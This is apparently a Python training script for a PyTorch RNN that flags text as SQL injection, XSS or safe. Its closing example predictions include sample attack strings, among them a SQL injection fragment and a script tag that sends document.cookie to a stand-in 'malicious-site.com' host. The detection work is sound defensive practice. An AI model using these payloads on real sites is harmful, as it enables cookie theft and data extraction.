#!/usr/bin/env python
# coding: utf-8

import torch
from torch.utils.data import Dataset, DataLoader, random_split
import numpy as np
import torch.optim as optim
import os
import random
import torch.nn as nn
import torch.nn.functional as F # Import for softmax

# Make sure Model.py is in the same directory as train.py
try:
    from Model import classifier
except ImportError:
    print("Error: Could not import 'classifier' from Model.py.")
    print("Please ensure Model.py exists in the same directory or update the import path.")
    exit() # Exit if the model class is essential


# Import all public names from libs.py
from libs import *

import pickle
# spacy is removed from libs.py

# Constants
SEED = 1000
BATCH_SIZE = 16
EMBEDDING_DIM = 100
HIDDEN_DIM = 32
NUM_LAYERS = 1
DROPOUT = 0.2
N_EPOCHS = 1
# Ensure these paths are correct relative to where you run train.py
DATA_PATH = 'csv_files/dt-v12.csv'
WEIGHTS_PATH = 'saved_weights/best_model.pt' # Give the best weights a specific name
MODELS_DIR = "saved_models"
WEIGHTS_DIR = "saved_weights"
BERT_MODEL_NAME = 'bert-base-uncased' # Not used in this specific RNN model
VOCAB_STOI_PATH = "pickles/vocab_stoi.pkl" # Save stoi separately
VOCAB_ITOS_PATH = "pickles/vocab_itos.pkl" # Save itos separately
LABEL_TO_INT_PATH = "pickles/label_to_int.pkl" # Save label mapping

# Create directories if they don't exist
os.makedirs(MODELS_DIR, exist_ok=True)
os.makedirs(WEIGHTS_DIR, exist_ok=True)
os.makedirs('pickles', exist_ok=True) # Ensure pickles directory exists

# Set random seeds for reproducibility
random.seed(SEED)
np.random.seed(SEED)
torch.manual_seed(SEED)
torch.cuda.manual_seed(SEED)
# torch.backends.cudnn.deterministic = True # May not be fully deterministic without torchtext

# --- Custom Dataset ---
class TextDataset(Dataset):
    def __init__(self, texts, labels, stoi, label_to_int, tokenizer, max_seq_len=128):
        self.texts = texts
        self.labels = labels
        self.stoi = stoi # token to index mapping
        self.label_to_int = label_to_int # label string to int mapping
        self.tokenizer = tokenizer
        self.max_seq_len = max_seq_len
        self.pad_idx = stoi.get('<pad>', 1) # Get index of the padding token

        # Tokenize and numericalize all texts upfront
        self.numericalized_texts = [
            numericalize_text(tokenizer(text), stoi) for text in texts
        ]
        # Convert label strings to integers
        self.numericalized_labels = [
            label_to_int.get(label, -1) for label in labels # Use -1 for unknown labels (shouldn't happen with proper mapping)
        ]

        # Filter out any samples that couldn't be processed (e.g., invalid labels or empty tokenization)
        valid_indices = [
            i for i, label_int in enumerate(self.numericalized_labels)
            if label_int != -1 and self.numericalized_texts[i] is not None and len(self.numericalized_texts[i]) > 0
        ]
        self.numericalized_texts = [self.numericalized_texts[i] for i in valid_indices]
        self.numericalized_labels = [self.numericalized_labels[i] for i in valid_indices]
        self.texts = [self.texts[i] for i in valid_indices] # Keep original texts for reference if needed

        print(f"Created Dataset with {len(self.numericalized_texts)} valid samples.")


    def __len__(self):
        return len(self.numericalized_texts)

    def __getitem__(self, idx):
        numericalized_text = self.numericalized_texts[idx]
        label_int = self.numericalized_labels[idx]

        # Handle padding and truncation
        if len(numericalized_text) > self.max_seq_len:
            numericalized_text = numericalized_text[:self.max_seq_len]
            length = self.max_seq_len
        else:
            length = len(numericalized_text)
            # Pad the sequence
            padding_needed = self.max_seq_len - length
            numericalized_text = numericalized_text + [self.pad_idx] * padding_needed

        # Convert to tensors
        text_tensor = torch.LongTensor(numericalized_text)
        label_tensor = torch.LongTensor([label_int])[0] # Ensure scalar tensor
        length_tensor = torch.LongTensor([length])[0] # Ensure scalar tensor

        return text_tensor, label_tensor, length_tensor

# --- Data Loading and Preprocessing ---
def load_and_preprocess_data_custom():
    print("Loading and preprocessing data with custom methods...")
    # Load raw text and labels from the CSV using the helper in libs
    texts, labels = load_data_from_csv(DATA_PATH, 'text', 'label') # Assuming 'text' and 'label' columns in dt-v6.csv

    if texts is None or labels is None:
        print("Exiting due to data loading errors.")
        return None, None, None, None, None

    # Build custom vocabulary (stoi and itos)
    # You might want to set min_freq higher for a larger dataset
    stoi, itos = build_vocabulary(texts, sql_tokenizer, min_freq=1) # Example: min_freq=2

    # Build label to integer mapping
    unique_labels = sorted(list(set(labels))) # Sort to ensure consistent mapping
    label_to_int = {label: i for i, label in enumerate(unique_labels)}
    int_to_label = {i: label for label, i in label_to_int.items()} # For mapping back

    print("\nLabel to Integer Mapping:")
    print(label_to_int)
    print("-" * 30)


    # Save vocab and label mapping
    print("Saving custom vocabulary and label mapping...")
    try:
        with open(VOCAB_STOI_PATH, 'wb') as f:
            pickle.dump(stoi, f)
        with open(VOCAB_ITOS_PATH, 'wb') as f:
            pickle.dump(itos, f)
        with open(LABEL_TO_INT_PATH, 'wb') as f:
            pickle.dump({'label_to_int': label_to_int, 'int_to_label': int_to_label}, f)
        print(f"Custom vocabulary saved to {VOCAB_STOI_PATH} and {VOCAB_ITOS_PATH}")
        print(f"Label mapping saved to {LABEL_TO_INT_PATH}")
    except Exception as e:
        print(f"Error saving custom vocabulary or label mapping: {e}")


    # Create custom Dataset
    full_dataset = TextDataset(texts, labels, stoi, label_to_int, sql_tokenizer)

    # Split dataset into train and validation sets
    train_size = int(0.7 * len(full_dataset))
    valid_size = len(full_dataset) - train_size
    # Use a generator for reproducibility with random_split
    generator = torch.Generator().manual_seed(SEED)
    train_dataset, valid_dataset = random_split(full_dataset, [train_size, valid_size], generator=generator)

    print(f"Number of training examples in split: {len(train_dataset)}")
    print(f"Number of validation examples in split: {len(valid_dataset)}")
    print("Data loaded and preprocessed with custom methods.")

    return train_dataset, valid_dataset, stoi, itos, label_to_int


# --- Create DataLoaders ---
def create_dataloaders(train_dataset, valid_dataset):
    print("Creating DataLoaders...")
    device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
    print(f"Using device: {device}")

    if train_dataset is None or valid_dataset is None:
         print("Error: Training or validation dataset is None. Cannot create DataLoaders.")
         return None, None, device
    if len(train_dataset) == 0 or len(valid_dataset) == 0:
         print("Error: Training or validation dataset is empty. Cannot create DataLoaders.")
         return None, None, device


    try:
        train_dataloader = DataLoader(train_dataset, batch_size=BATCH_SIZE, shuffle=True)
        valid_dataloader = DataLoader(valid_dataset, batch_size=BATCH_SIZE, shuffle=False) # No need to shuffle validation data

        print("DataLoaders created.")
        return train_dataloader, valid_dataloader, device
    except Exception as e:
        print(f"Error creating DataLoaders: {e}")
        return None, None, device

# Initialize model
def initialize_model(vocab_size, output_dim, device):
    print("Initializing model...")
    # Ensure the classifier class was imported successfully
    if 'classifier' not in globals():
         print("Error: Model class 'classifier' not available.")
         return None

    try:
        model = classifier(vocab_size, EMBEDDING_DIM, HIDDEN_DIM, output_dim, NUM_LAYERS, bidirectional=True, dropout=DROPOUT).to(device)
        print(model)
        print(f'The model has {count_parameters(model):,} trainable parameters')
        print("Model initialized.")
        return model
    except Exception as e:
        print(f"Error initializing model: {e}")
        return None


# Count trainable parameters
def count_parameters(model):
    return sum(p.numel() for p in model.parameters() if p.requires_grad)

# Define loss and optimizer
def define_loss_optimizer(model, device):
    print("Defining loss and optimizer...")
    if model is None:
        print("Error: Model is None. Cannot define loss and optimizer.")
        return None, None
    optimizer = optim.Adam(model.parameters(), lr=1e-4, weight_decay=1e-5)

    # Use CrossEntropyLoss for multi-class classification
    criterion = nn.CrossEntropyLoss().to(device)
    print("Loss and optimizer defined.")
    return optimizer, criterion


# Accuracy function for multi-class classification
def categorical_accuracy(preds, y):
    """
    Returns accuracy per batch, i.e. if you get 8/10 correct, this returns 0.8
    """
    max_preds = preds.argmax(dim=1, keepdim=True) # get the index of the max probability
    correct = max_preds.squeeze(1).eq(y)
    # Move the tensor for division to the same device as 'correct'
    return correct.sum().float() / torch.FloatTensor([y.shape[0]]).to(correct.device)


# Training loop
def train(model, dataloader, optimizer, criterion, device):
    model.train()
    epoch_loss, epoch_acc = 0, 0
    progress_interval = max(1, len(dataloader) // 10) # Print progress 10 times per epoch

    for i, (text, label, text_lengths) in enumerate(dataloader):
        # Move batch to device
        text = text.to(device)
        label = label.to(device)
        # text_lengths are already on CPU from the Dataset/DataLoader
        # and are expected to be LongTensor by pack_padded_sequence
        # Ensure text_lengths is indeed a LongTensor on CPU
        if text_lengths.device.type != 'cpu' or text_lengths.dtype != torch.long:
             text_lengths = text_lengths.cpu().long()


        optimizer.zero_grad()

        # Pass the length tensor (on CPU) to the model
        predictions = model(text, text_lengths) # Squeeze is typically not needed for CrossEntropyLoss output

        # Ensure label is LongTensor for CrossEntropyLoss (handled in Dataset)
        loss = criterion(predictions, label)
        acc = categorical_accuracy(predictions, label)

        loss.backward()
        optimizer.step()

        epoch_loss += loss.item()
        epoch_acc += acc.item()

        # Print progress
        if (i + 1) % progress_interval == 0:
             print(f'  Batch {i+1}/{len(dataloader)}: Train Loss = {loss.item():.3f}, Train Acc = {acc.item() * 100:.2f}%')


    return epoch_loss / len(dataloader), epoch_acc / len(dataloader)

# Evaluation loop
def evaluate(model, dataloader, criterion, device):
    model.eval()
    epoch_loss, epoch_acc = 0, 0
    with torch.no_grad():
        for text, label, text_lengths in dataloader:
            # Move batch to device
            text = text.to(device)
            label = label.to(device)
            # Ensure text_lengths is LongTensor on CPU
            if text_lengths.device.type != 'cpu' or text_lengths.dtype != torch.long:
                 text_lengths = text_lengths.cpu().long()

            # Pass the length tensor (on CPU) to the model
            predictions = model(text, text_lengths) # Squeeze typically not needed

            loss = criterion(predictions, label)
            acc = categorical_accuracy(predictions, label)

            epoch_loss += loss.item()
            epoch_acc += acc.item()

    return epoch_loss / len(dataloader), epoch_acc / len(dataloader)

# Save model function
def save_model(model, valid_acc, epoch):
    # Create directories if they don't exist
    os.makedirs(MODELS_DIR, exist_ok=True)
    os.makedirs(WEIGHTS_DIR, exist_ok=True)

    md_val_acc = "%.2f" % (valid_acc * 100)
    model_name = f"epoch_{epoch}_Acc_{md_val_acc}.pt"
    model_path_models = os.path.join(MODELS_DIR, model_name)
    model_path_weights = os.path.join(WEIGHTS_DIR, model_name) # Save in both dirs

    try:
        torch.save(model.state_dict(), model_path_models)
        torch.save(model.state_dict(), model_path_weights)
        print(f"SAVED model state_dict to {model_path_models} and {model_path_weights}")
    except Exception as e:
        print(f"Error saving model: {e}")


# Prediction function
# Added optional ground_truth_label parameter
def predict(model, sentence, device, stoi, itos, label_to_int, int_to_label, tokenizer, max_seq_len=128, ground_truth_label=None):
    model.eval() # Set model to evaluation mode

    # Process the sentence using the custom sql_tokenizer
    tokenized = tokenizer(sentence)

    # Handle empty tokenized list
    if not tokenized:
        print(f"Warning: Tokenization resulted in an empty list for sentence: '{sentence}'")
        print("--------------------------\n")
        return None # Or handle as appropriate

    print(f"Sentence: '{sentence}'") # Print the original sentence
    print(f"Tokenized: {tokenized}")

    # Convert tokens to indices using the stoi mapping
    # Use .get() with a default for <unk>
    unk_idx = stoi.get('<unk>', 0)
    # Corrected typo here: use unk_idx instead of un_idx
    indexed = [stoi.get(token, unk_idx) for token in tokenized]


    print(f"Indexed: {indexed}")

    # Handle padding and truncation for prediction
    if len(indexed) > max_seq_len:
        indexed = indexed[:max_seq_len]
        length = max_seq_len
    else:
        length = len(indexed)
        # Pad the sequence
        pad_idx = stoi.get('<pad>', 1)
        padding_needed = max_seq_len - length
        indexed = indexed + [pad_idx] * padding_needed


    # Convert to tensors and move to device
    # Add batch dimension (BATCH_SIZE=1 for a single sentence)
    tensor = torch.LongTensor(indexed).unsqueeze(0).to(device) # Shape becomes [1, max_seq_len]

    length_tensor = torch.LongTensor([length]) # Lengths tensor stays on CPU, shape [1]


    # print(f"Input Tensor shape: {tensor.shape}")
    # print(f"Length Tensor: {length_tensor}")

    with torch.no_grad():
        # Pass the length tensor (on CPU) to the model
        prediction_logits = model(tensor, length_tensor)

    # Apply softmax to get probabilities
    prediction_probs = F.softmax(prediction_logits, dim=1) # dim=1 because it's a batch of 1

    # Get the predicted class index (highest probability)
    predicted_class_index = prediction_probs.argmax(dim=1).item()

    # Map the index back to the label string
    pred_lbl = "Unknown" # Default in case of index out of bounds
    if 0 <= predicted_class_index < len(int_to_label):
        pred_lbl = int_to_label[predicted_class_index]

    print('Predicted threat type:', pred_lbl)

    # Display probabilities for all labels
    print("Prediction Probabilities:")
    # Sort labels by their index for consistent output order
    sorted_labels = sorted(int_to_label.items(), key=lambda item: item[0]) # Sort by index
    for idx, label in sorted_labels:
        prob = prediction_probs[0, idx].item() # Get probability for this label (from batch item 0)
        print(f"  {label}: {prob:.2%}") # Format as percentage


    # Check correctness if ground_truth_label is provided
    if ground_truth_label is not None:
        if pred_lbl == ground_truth_label:
            print(f'Prediction: Correct (Ground Truth: {ground_truth_label})')
        else:
            print(f'Prediction: Incorrect (Ground Truth: {ground_truth_label})')


    print("--------------------------\n")
    return prediction_logits # You might want to return logits or probabilities


if __name__ == "__main__":
    # Load and preprocess data using custom methods
    train_dataset, valid_dataset, stoi, itos, label_to_int = load_and_preprocess_data_custom()

    if train_dataset is None or valid_dataset is None or stoi is None or itos is None or label_to_int is None:
        print("Exiting due to data loading, preprocessing, or vocabulary errors.")
        exit()

    # Create DataLoaders
    train_dataloader, valid_dataloader, device = create_dataloaders(train_dataset, valid_dataset)

    if train_dataloader is None or valid_dataloader is None:
         print("Exiting due to DataLoader creation errors.")
         exit()

    # Get vocabulary size and output dimension from custom mappings
    vocab_size = len(stoi)
    output_dim = len(label_to_int)
    # Create the reverse mapping for prediction output
    int_to_label = {i: label for label, i in label_to_int.items()}


    # Initialize model
    model = initialize_model(vocab_size, output_dim, device)

    if model is None:
        print("Exiting due to model initialization errors.")
        exit()

    # Define loss and optimizer
    optimizer, criterion = define_loss_optimizer(model, device)

    if optimizer is None or criterion is None:
        print("Exiting due to loss/optimizer definition errors.")
        exit()

    # Add early stopping logic
    patience = 5  # Number of epochs to wait for improvement
    patience_counter = 0
    best_valid_loss = float('inf')
    best_valid_acc = 0 # Track best accuracy to save the model
    best_epoch = 0

    print("Starting training...")
    for epoch in range(N_EPOCHS):
        print(f"\nEpoch {epoch+1}/{N_EPOCHS}")
        train_loss, train_acc = train(model, train_dataloader, optimizer, criterion, device)
        valid_loss, valid_acc = evaluate(model, valid_dataloader, criterion, device)

        # Check for improvement in validation loss for early stopping
        if valid_loss < best_valid_loss:
            best_valid_loss = valid_loss
            best_valid_acc = valid_acc # Update best accuracy when loss improves
            best_epoch = epoch + 1
            # Save the model state dictionary for the best model based on validation loss
            try:
                torch.save(model.state_dict(), WEIGHTS_PATH)
                print(f"Saved best model state_dict to {WEIGHTS_PATH}")
            except Exception as e:
                 print(f"Error saving best model: {e}")
            patience_counter = 0 # Reset patience counter
        else:
            patience_counter += 1
            print(f"Validation loss did not improve. Patience: {patience_counter}/{patience}")
            if patience_counter >= patience:
                print("Early stopping triggered.")
                break # Stop training


        print(f'\nEpoch {epoch+1} Results:')
        print(f'\tTrain Loss: {train_loss:.3f} | Train Acc: {train_acc * 100:.2f}%')
        print(f'\t Val. Loss: {valid_loss:.3f} |  Val. Acc: {valid_acc * 100:.2f}%')

    print("\nTraining finished.")
    # Load the best model weights before making predictions
    if os.path.exists(WEIGHTS_PATH):
        print(f"Loading best model weights from {WEIGHTS_PATH} for prediction.")
        try:
            model.load_state_dict(torch.load(WEIGHTS_PATH))
            model.to(device) # Ensure model is on the correct device
        except Exception as e:
            print(f"Error loading best model weights: {e}")
    else:
        print(f"Warning: Best weights not found at {WEIGHTS_PATH}. Using the last trained model state for prediction.")


    print("\n--- Example Predictions ---")
    # Pass the custom vocabulary mappings to the predict function
    # stoi, itos, label_to_int, int_to_label are available because of load_and_preprocess_data_custom
    # and the * import brought sql_tokenizer into scope.
    if 'stoi' in globals() and 'itos' in globals() and 'label_to_int' in globals() and 'int_to_label' in globals():
        # Example sentences with assumed ground truth labels
        predict(model, 'group_concat(namapemohon,0x3a,email),3,4,5,6 from pendaftaran_user ', device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='sql')
        predict(model, 'alert(1) </script>', device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='xss')
        predict(model, 'select * from users where id=1;', device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='sql')
        predict(model, 'this is a safe text', device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='safe')
        predict(model,"<h1>Hello World</h1>", device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='xss') # HTML might be safe or XSS depending on context/definition
        predict(model,"<script> this is a safe text dont worry", device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='xss')
        predict(model,"<script>fetch('http://malicious-site.com/steal?cookie=' + document.cookie)</script>", device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='xss')
        predict(model,"make sure you select from from the groups where they are equal to eachother", device, stoi, itos, label_to_int, int_to_label, sql_tokenizer, ground_truth_label='safe') # Assuming this isn't a malicious SQL query

    else:
        print("Custom vocabulary or label mappings not available for prediction.")